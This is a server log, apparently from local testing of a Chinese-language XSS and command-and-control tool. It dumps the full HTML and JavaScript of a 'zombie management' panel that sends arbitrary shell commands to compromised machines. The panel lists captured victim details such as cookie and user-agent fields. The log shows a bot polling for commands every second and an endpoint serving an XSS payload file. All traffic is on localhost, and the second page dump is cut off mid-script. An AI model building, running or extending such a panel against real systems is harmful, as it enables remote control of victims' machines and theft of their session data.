2025-06-24 23:21:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0008s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        <div class="container mt-4">\n            \n            <div class="alert alert-success alert-dismissible fade show" role="alert">\n                成功為 127.0.0.1 添加命令！\n                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>\n            </div>\n            \n        </div>\n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    <div class="flash-messages">\n        \n        <div class="flash-message success">\n            成功為 127.0.0.1 添加命令！\n            <button class="close-btn" onclick="this.parentElement.style.display=\'none\'">&times;</button>\n        </div>\n        \n    </div>\n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T15:20:57.064Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:20:57.066659</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:21:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:22] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:21:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:21:40 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:21:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:21:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:40] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:21:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:40] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:21:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:21:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:21:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:21:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:21:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:21:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:21:46 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:21:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0012s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T15:20:57.064Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:20:57.066659</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 